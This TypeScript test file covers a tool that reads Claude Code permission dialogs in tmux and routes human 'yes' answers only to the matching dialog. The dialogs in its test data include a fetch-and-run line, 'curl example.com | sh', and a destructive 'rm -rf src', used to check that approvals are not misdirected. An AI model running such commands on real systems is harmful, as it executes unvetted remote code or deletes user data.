import { afterAll, expect, spyOn, test } from 'bun:test'
import { chmodSync, existsSync, writeFileSync } from 'node:fs'
import { join } from 'node:path'
import { dialog } from '../test/dialog'
import { tempDirs } from '../test/tmp'
import { permissionQuestion } from './decisions'
import { dialogOn, WAIT } from './dialog'
import { onNotification } from './hooks'
import { Ledger } from './ledger'
import { Tmux } from './tmux'
import { answer } from './worker'

const tmp = tempDirs()
afterAll(tmp.removeAll)

// Tests whose dialog never comes or goes do not wait for it.
WAIT.dialogMs = 0

const OF_AGENT = 'Bash command · from the general-purpose agent'
// A subagent's dialog; `place`, in the queue.
const agents = (command: string, place = ''): string =>
  dialog(command, undefined, 120, OF_AGENT + place)
const HEAD = 'Claude needs your permission. Answer yes to allow; anything else denies.'
const words = (screen: string): string => `${HEAD} Its dialog:\n${dialogOn(screen)?.text}`
const UNSEEN = `${HEAD}\n어느 명령인지 확인하지 못함 (nod attach n1)`
// Taller than the terminal: its top is out of sight, with who asks.
const topless = (screen: string): string => screen.split('\n').slice(6).join('\n')

// A task whose worker's turn is open, in a terminal that shows `screens`, the next one each time it is
// read and the last from then on, and counts how often it was.
function running(...screens: (string | Error)[]) {
  const home = tmp.make('nod-dialog-')
  const ledger = new Ledger(home)
  const id = ledger.add({
    brief: 'look it up',
    repo: null,
    branch: null,
    checkCmd: null,
    model: null,
    after: [],
    issue: null,
  })
  ledger.setRunning(id, home)
  const attemptId = ledger.startAttempt({
    taskId: id,
    kind: 'start',
    decisionId: null,
    sessionId: 's1',
    prompt: 'look it up',
  })
  // `onKeys`: what happens as keys go in.
  const terminal = { reads: 0, keys: [] as string[], screens, onKeys: () => {} }
  const terminals = Object.assign(Tmux.of(home), {
    alive: () => true,
    option: () => '',
    keys: (_: string, ...keys: string[]) => {
      terminal.keys.push(...keys)
      terminal.onKeys()
    },
    screen: () => {
      const screen = terminal.screens[Math.min(terminal.reads, terminal.screens.length - 1)] ?? ''
      terminal.reads += 1
      if (screen instanceof Error) throw screen
      return screen
    },
  })
  const show = (...next: (string | Error)[]): void => {
    Object.assign(terminal, { reads: 0, screens: next })
  }
  const notified = () =>
    onNotification(ledger, home, terminals, {
      session_id: 's1',
      notification_type: 'permission_prompt',
      message: 'Claude needs your permission',
    })
  const open = () => ledger.decisions(id).filter((d) => d.answer === null)
  const asked = () => open().map((d) => d.question)
  const yes = (n: number) => answer(ledger, home, terminals, open()[n]?.id ?? 0, 'yes', 'human')
  // As the PermissionRequest hook opens the main thread's (onPermissionAsk).
  const hooked = (tool: string, input: Record<string, unknown>) =>
    ledger.ask(id, attemptId, 'permission', permissionQuestion(tool, input))
  return { home, ledger, id, attemptId, terminal, show, notified, asked, yes, hooked }
}

// Nod's own wait, long, in a test whose screen ends it.
async function waiting(run: () => Promise<unknown>): Promise<void> {
  WAIT.dialogMs = 60_000
  try {
    await run()
  } finally {
    WAIT.dialogMs = 0
  }
}

const ONE = "sed -n '1,140p' src/a.ts"
const TWO = "sed -n '30,125p' src/a.ts"

test('nod reads the dialog on the screen: what it asks and who asks, and compares it whatever its width, its place in the queue and its time left', () => {
  const one = dialogOn(agents(ONE, '     1 of 2'))
  expect(one).toMatchObject({ subagents: true, more: true })
  expect(one?.text).toStartWith(` ${OF_AGENT}     1 of 2\n Show it\n`)
  expect(one?.text).toContain(ONE)
  expect(one?.text).toEndWith(' ❯ 1. Yes\n   2. No')
  // Not what was there before it.
  expect(one?.text).not.toContain('⎿')

  for (const screen of [
    agents(ONE),
    agents(ONE, '   2 of 2'),
    // Narrower, its warning of the time left on two lines or three.
    ...[99, 72, 60, 59, 48].map((width) => dialog(ONE, undefined, width, OF_AGENT)),
    agents(ONE).replace('1:53', '0:09'),
    dialog(ONE, undefined, 60, OF_AGENT).replace('1:53', '0:09'),
    agents(ONE).replace(/ ⚠.*\n/, ''),
    agents(ONE).replace(' ❯ 1. Yes\n   2.', '   1. Yes\n ❯ 2.'),
    `${agents(TWO)}\n${agents(ONE)}\n\n Esc to cancel · Tab to amend\n\n\n`,
  ]) {
    expect([screen, dialogOn(screen)?.asks]).toEqual([screen, one?.asks])
    expect(dialogOn(screen)).toMatchObject({ more: false, whole: true })
  }
  expect(dialogOn(agents(TWO))?.asks).not.toBe(one?.asks)
  expect(dialogOn(dialog(ONE))?.asks).not.toBe(one?.asks)

  for (const [title, subagents] of [
    ['Bash command', false],
    ['Bash command · from the tidy plugin', false],
    ['Bash command · from the Explore agent', true],
    ['Bash command · from a subagent', true],
    ['Edit file · from the "review" workflow', true],
    ['Bash command · from a workflow', true],
  ] as const) {
    expect([title, dialogOn(dialog(ONE, undefined, 80, title))?.subagents]).toEqual([
      title,
      subagents,
    ])
  }

  // A warning in what a tool would get is no warning of the time left.
  const tool = (param: string): string =>
    [
      '─'.repeat(60),
      ' Tool use · from the general-purpose agent',
      ' db - query(sql: "x")',
      ` ⚠ ${param}`,
      '',
      ' Do you want to proceed?',
      ' ❯ 1. Yes',
      '   2. No',
    ].join('\n')
  expect(dialogOn(tool('drop table a'))?.asks).not.toBe(dialogOn(tool('drop table b'))?.asks)
  // Its top is out of sight, and what it asks with it.
  expect(dialogOn(topless(agents(ONE)))).toMatchObject({ whole: false })
  // None; one half drawn; what only looks like its answers.
  const rule = '─'.repeat(60)
  for (const screen of [
    '',
    `● Done.\n\n${rule}\n❯ \n${rule}\n  ? for shortcuts`,
    `${rule}\n❯ \n────────a.ts | head -90\n╌╌╌╌╌╌╌╌╌╌╌╌\n │ Auto mode needs your confirmation`,
    `${rule}\n 1. first\n 2. second\n`,
  ]) {
    expect([screen, dialogOn(screen)]).toEqual([screen, null])
  }
})

test('of two dialogs a subagent’s calls wait in, each gets its decision once it shows, in its own words; the Notification of the one behind opens none', async () => {
  const { show, notified, asked, yes, terminal, ledger, id } = running()
  const [first, second] = [agents(ONE, '     1 of 2'), agents(TWO)]
  show(first)
  await notified()
  await notified()
  expect(asked()).toEqual([words(first)])
  expect(asked()[0]).not.toContain(TWO)

  // Its answer: the one behind shows after a moment, and has its decision at once.
  show(first, first, '', second)
  await waiting(() => yes(0))
  expect(terminal.keys).toEqual(['Enter'])
  expect(asked()).toEqual([words(second)])
  expect(ledger.get(id).status).toBe('needs_decision')
  // Its own Notification, as it shows, opens no other.
  await notified()
  expect(asked()).toEqual([words(second)])
  await waiting(() => yes(0))
  expect(terminal.keys).toEqual(['Enter', 'Enter'])
  expect(asked()).toEqual([])
})

test('the dialog behind one answered in the terminal gets a decision with its own Notification, beside the one left open', async () => {
  const { show, notified, asked } = running()
  show(agents(ONE, '     1 of 2'))
  await notified()
  show(agents(TWO))
  await notified()
  await notified()
  expect(asked()).toEqual([words(agents(ONE, '     1 of 2')), words(agents(TWO))])
})

test('two Notifications that read the screen at once open one decision', async () => {
  const { home, ledger, id, attemptId, show, notified, asked } = running()
  show(agents(ONE))
  // The other's hook, in its own process, opens it right after this one saw none.
  const look = ledger.decisions.bind(ledger)
  const other = new Ledger(home)
  const spy = spyOn(ledger, 'decisions').mockImplementationOnce((task) => {
    const seen = look(task)
    other.ask(id, attemptId, 'permission', words(agents(ONE)))
    return seen
  })
  try {
    await notified()
  } finally {
    spy.mockRestore()
  }
  expect(asked()).toEqual([words(agents(ONE))])
})

test('a Notification that comes as its dialog was answered opens nothing once it is gone; the next one’s opens its own; one that stays is asked again', async () => {
  const { show, notified, asked, yes, terminal, ledger } = running()
  const answered = async () => {
    show(agents(ONE))
    await notified()
    await yes(0)
    expect(asked()).toEqual([])
  }
  await answered()
  show(agents(ONE), agents(ONE), '● Reading')
  await waiting(notified)
  expect(asked()).toEqual([])
  expect(terminal.reads).toBe(3)

  show(agents(ONE), agents(TWO))
  await waiting(notified)
  expect(asked()).toEqual([words(agents(TWO))])
  show(agents(TWO))
  await yes(0)

  // The key did not reach it.
  show(agents(TWO))
  await notified()
  expect(asked()).toEqual([words(agents(TWO))])

  // One nod answered a while ago is not why this one cannot be read.
  await yes(0)
  show('● Reading')
  await notified()
  expect(asked()).toEqual([])
  const ago = new Date(Date.now() - 6000).toISOString()
  ledger.db.query('update decisions set answered_at = $ago').run({ ago })
  await notified()
  expect(asked()).toEqual([UNSEEN])
})

test('a decision on a dialog nod cannot read says so, and shows no other command; it waits for one to be drawn', async () => {
  const other = '  Bash(rm -rf src)\n  ⎿  Running…\n'
  const gone = new Error('tmux capture-pane failed')
  for (const screen of [
    other,
    `${other}${'─'.repeat(60)}\n❯ 1\n${'─'.repeat(60)}`,
    topless(agents(ONE)),
    gone,
  ]) {
    const { notified, asked } = running(screen)
    await notified()
    expect(asked()).toEqual([UNSEEN])
    await notified()
    expect(asked()).toEqual([UNSEEN])
  }
  const { terminal, notified, asked } = running(other, topless(agents(ONE)), agents(ONE))
  await waiting(notified)
  expect(asked()).toEqual([words(agents(ONE))])
  expect(terminal.reads).toBe(3)
})

test('once nod can read what shows, its decision takes the place of one nod could not read; a yes to that one goes to no dialog it did not show', async () => {
  // Also another tool's.
  const edit = dialog('1 - a\n2 + b', undefined, 80, 'Edit file · from the general-purpose agent')
  for (const [screen, next] of [
    ['', agents(TWO)],
    [topless(agents(ONE)), agents(TWO)],
    ['', edit],
  ]) {
    const { show, notified, asked, ledger, id } = running(screen ?? '')
    await notified()
    show(next ?? '')
    await notified()
    await notified()
    expect(asked()).toEqual([words(next ?? '')])
    expect(ledger.decisions(id)[0]?.answer).toBe('(nod can read its dialog now)')
  }
  const { show, notified, asked, yes, terminal } = running('')
  await notified()
  show(agents(TWO))
  await expect(yes(0)).rejects.toThrow("shows another dialog than d1's: answer d2 first")
  expect(asked()).toEqual([words(agents(TWO))])
  expect(terminal.keys).toEqual([])
  await yes(0)
  expect(terminal.keys).toEqual(['Enter'])

  // Still out of sight: the person has looked, and it takes the yes.
  const tall = running(topless(agents(ONE)))
  await tall.notified()
  await tall.yes(0)
  expect(tall.terminal.keys).toEqual(['Enter'])
})

test('a dialog whose top is out of sight is not that of a decision worded from another one left open', async () => {
  const { show, notified, asked, yes, terminal } = running(agents(ONE))
  await notified()
  // Answered in the terminal, so its decision stays open; the next is taller than the terminal.
  show(topless(agents(TWO)))
  await notified()
  expect(asked()).toEqual([words(agents(ONE)), UNSEEN])
  await expect(yes(0)).rejects.toThrow("another dialog than d1's: answer d2 first")
  expect(terminal.keys).toEqual([])
  await yes(1)
  expect(terminal.keys).toEqual(['Enter'])
})

test('a dialog that shows before the main thread’s, a subagent’s or another command’s, gets its own decision; the one whose hook opened it, no other', async () => {
  const { show, notified, asked, hooked } = running()
  hooked('Bash', { command: 'git push' })
  const main = permissionQuestion('Bash', { command: 'git push' })
  for (const screen of [dialog('git push'), '']) {
    show(screen)
    await waiting(notified)
    expect([screen, asked()]).toEqual([screen, [main]])
  }
  // Another command's, whose hook did not run, or failed.
  const force = dialog('git push --force')
  for (const screen of [force, force, dialog('git push')]) {
    show(screen)
    await notified()
    expect(asked()).toEqual([main, words(force)])
  }
  // A subagent's, also of the same command; and one whose top is out of sight, which is no short
  // command's, also of one of a few lines, but may be a long one's.
  for (const screen of [agents('git push'), agents('git push'), dialog('git push')]) {
    show(screen)
    await notified()
    expect(asked()).toEqual([main, words(force), words(agents('git push'))])
  }
  const [short, long] = [running(topless(agents(ONE))), running(topless(agents(ONE)))]
  short.hooked('Bash', { command: 'git push' })
  long.hooked('Bash', { command: `echo ${'x'.repeat(3000)}` })
  await short.notified()
  await long.notified()
  expect(short.asked()).toEqual([main, UNSEEN])
  await expect(short.yes(0)).rejects.toThrow("another dialog than d1's: answer d2 first")
  expect(long.asked()).toHaveLength(1)
  const commit = 'git commit -q -m "fix: a\n\n- b"'
  const lines = running(topless(agents(ONE)))
  lines.hooked('Bash', { command: commit })
  await lines.notified()
  expect(lines.asked()).toEqual([permissionQuestion('Bash', { command: commit }), UNSEEN])
  await expect(lines.yes(0)).rejects.toThrow('answer d2 first')
  expect(lines.terminal.keys).toEqual([])
  // Its command in sight, but not who asks.
  const cut = running(dialog('git push').split('\n').slice(4).join('\n'))
  cut.hooked('Bash', { command: 'git push' })
  await cut.notified()
  expect(cut.asked()).toEqual([main, UNSEEN])
  await expect(cut.yes(0)).rejects.toThrow('answer d2 first')
  expect(cut.terminal.keys).toEqual([])
})

test('a yes goes only to the dialog its decision is about: while another shows it is refused, and nothing is typed', async () => {
  const { show, notified, asked, yes, hooked, terminal, ledger, id } = running()
  const [a = 0, b = 0] = ['git push', 'git push --tags'].map((command) =>
    hooked('Bash', { command }),
  )
  // Two of the main thread's at once: the first shows.
  show(dialog('git push', undefined, 80, 'Bash command    1 of 2'))
  await expect(yes(1)).rejects.toThrow(
    `n1's terminal shows another dialog than d${b}'s: answer d${a} first`,
  )
  expect(terminal.keys).toEqual([])
  expect(asked()).toHaveLength(2)
  expect(ledger.get(id).status).toBe('needs_decision')
  await yes(0)
  show(dialog('git push --tags'))
  await yes(0)
  expect(terminal.keys).toEqual(['Enter', 'Enter'])

  // A subagent's, which another one's or the main thread's decision is not about. One with no decision
  // yet gets it.
  show(agents(ONE))
  await notified()
  const c = ledger.decisions(id).at(-1)?.id ?? 0
  const long = `echo ${'x'.repeat(3000)}`
  hooked('Bash', { command: ONE })
  hooked('Bash', { command: long })
  await expect(yes(1)).rejects.toThrow(`answer d${c} first`)
  await expect(yes(2)).rejects.toThrow(`answer d${c} first`)
  show(agents(TWO))
  await expect(yes(0)).rejects.toThrow(
    `n1's terminal shows another dialog than d${c}'s: answer d${c + 3} first`,
  )
  show(dialog('1 - a\n2 + b', undefined, 80, 'Edit file'))
  await expect(yes(0)).rejects.toThrow('look at it (nod attach n1) first')
  // The long one's may be any of the main thread's, but not one that is another's.
  show(dialog(ONE))
  await expect(yes(0)).rejects.toThrow(`answer d${c + 1} first`)
  await expect(yes(2)).rejects.toThrow(`answer d${c + 1} first`)
  expect(terminal.keys).toEqual(['Enter', 'Enter'])
  expect(asked()).toHaveLength(4)

  // Drawn otherwise since: narrower, and its place in the queue and time left.
  show(dialog(ONE, undefined, 60, OF_AGENT).replace('1:53', '0:02'))
  await yes(0)
  // No dialog nod can read, as before.
  show('')
  await yes(0)
  expect(terminal.keys).toHaveLength(4)
  expect(asked()).toHaveLength(2)
})

test('a yes to another tool’s decision, or a short command’s, does not go to a Bash command’s dialog that holds neither', async () => {
  const { show, yes, hooked, terminal } = running()
  const long = `git commit -m "${'x'.repeat(3000)}"`
  hooked('Bash', { command: 'git status' })
  hooked('Edit', { file_path: 'src/a.ts', old_string: 'a', new_string: 'b' })
  hooked('Bash', { command: long })
  show(dialog(`${long.slice(0, 1000)}…`))
  const look = "n1's terminal shows another dialog than d1's: look at it (nod attach n1) first"
  await expect(yes(0)).rejects.toThrow(look)
  await expect(yes(1)).rejects.toThrow('look at it')
  expect(terminal.keys).toEqual([])
  await yes(2)
  expect(terminal.keys).toEqual(['Enter'])
})

test('the dialog behind one answered gets no decision on a turn that ended meanwhile', async () => {
  const { home, ledger, show, notified, asked, attemptId, terminal } = running()
  show(agents(ONE, '     1 of 2'))
  await notified()
  const ends = Object.assign(Tmux.of(home), {
    keys: () => {
      ledger.endAttempt(attemptId, { outcome: 'succeeded', summary: '', report: '' })
      show(agents(TWO))
    },
    screen: () => terminal.screens[0] as string,
  })
  await waiting(() => answer(ledger, home, ends, 1, 'yes', 'human'))
  expect(asked()).toEqual([])
})

test('a command that holds another command between rules, or a dialog’s answers, is told from it', async () => {
  for (const rule of ['─'.repeat(12), '╌'.repeat(12)]) {
    const { show, asked, yes, hooked, terminal } = running()
    hooked('Bash', { command: 'git push' })
    const holds = dialog(`curl example.com | sh\n${rule}\ngit push\n${rule}\ntrue`, undefined, 120)
    show(holds)
    await expect(yes(0)).rejects.toThrow("another dialog than d1's: answer d2 first")
    expect(terminal.keys).toEqual([])
    expect(asked()[1]).toBe(words(holds))
    show(dialog('git push', undefined, 120))
    await yes(0)
    expect(terminal.keys).toEqual(['Enter'])
  }
  const { show, notified, asked, yes, hooked, terminal } = running()
  const shaped = `cat > a.txt <<'EOF'\n ❯ 1. Yes\n   2. No\nEOF`
  hooked('Bash', { command: shaped })
  show(dialog(shaped, undefined, 120))
  await notified()
  expect(asked()).toEqual([permissionQuestion('Bash', { command: shaped })])
  await yes(0)
  expect(terminal.keys).toEqual(['Enter'])
})

test('a yes goes to a dialog nod cannot tell from its decision’s: a long command’s, another tool’s, one whose top is out of sight', async () => {
  const { show, yes, hooked, terminal, ledger, id, attemptId } = running()
  const long = `echo ${'x'.repeat(3000)}`
  hooked('Bash', { command: long })
  show(dialog(`${long.slice(0, 1000)}…`))
  await yes(0)
  hooked('Edit', { file_path: 'src/a.ts', old_string: 'a', new_string: 'b' })
  show(dialog('1 - a\n2 + b', undefined, 80, 'Edit file'))
  await yes(0)
  hooked('Bash', { command: long })
  show(topless(dialog(long)))
  await yes(0)
  show('')
  ledger.ask(id, attemptId, 'permission', 'Claude needs your permission to use Bash')
  await yes(0)
  expect(terminal.keys).toHaveLength(4)
})

test('a yes goes in as soon as nod read the dialog it goes to, before what may take a while is told', async () => {
  const { home, notified, yes, terminal } = running(agents(ONE))
  await notified()
  const heard = join(home, 'heard')
  writeFileSync(join(home, 'notify'), `#!/bin/sh\ncat >> '${heard}'\n`)
  chmodSync(join(home, 'notify'), 0o755)
  const told: boolean[] = []
  terminal.onKeys = () => told.push(existsSync(heard))
  await yes(0)
  expect(told).toEqual([false])
  expect(existsSync(heard)).toBe(true)
})

test('a dialog answered just now that still shows is not asked about again as a yes to another decision reads it', async () => {
  const { show, notified, asked, yes, hooked, terminal, ledger, id } = running()
  hooked('Bash', { command: 'git push' })
  show(agents(ONE))
  await notified()
  await yes(1)
  expect(terminal.keys).toEqual(['Enter'])
  const answered = ledger.decisions(id).at(-1)?.id
  await expect(yes(0)).rejects.toThrow(
    `n1's terminal shows another dialog than d1's: that of d${answered}, answered, may still show: try again in a moment`,
  )
  expect(asked()).toEqual([permissionQuestion('Bash', { command: 'git push' })])
  show(dialog('git push'))
  await yes(0)
  expect(terminal.keys).toEqual(['Enter', 'Enter'])
})

test('a yes waits for no dialog behind when none waits, or when another decision of the turn is open', async () => {
  const { show, notified, yes, hooked, terminal, asked } = running()
  show(agents(ONE))
  await notified()
  show(agents(ONE))
  await waiting(() => yes(0))
  expect(terminal.reads).toBe(1)

  hooked('Bash', { command: 'git push' })
  show(agents(TWO, '     1 of 2'))
  await notified()
  show(agents(TWO, '     1 of 2'))
  await waiting(() => yes(1))
  expect(terminal.reads).toBe(1)
  expect(asked()).toEqual([permissionQuestion('Bash', { command: 'git push' })])
})
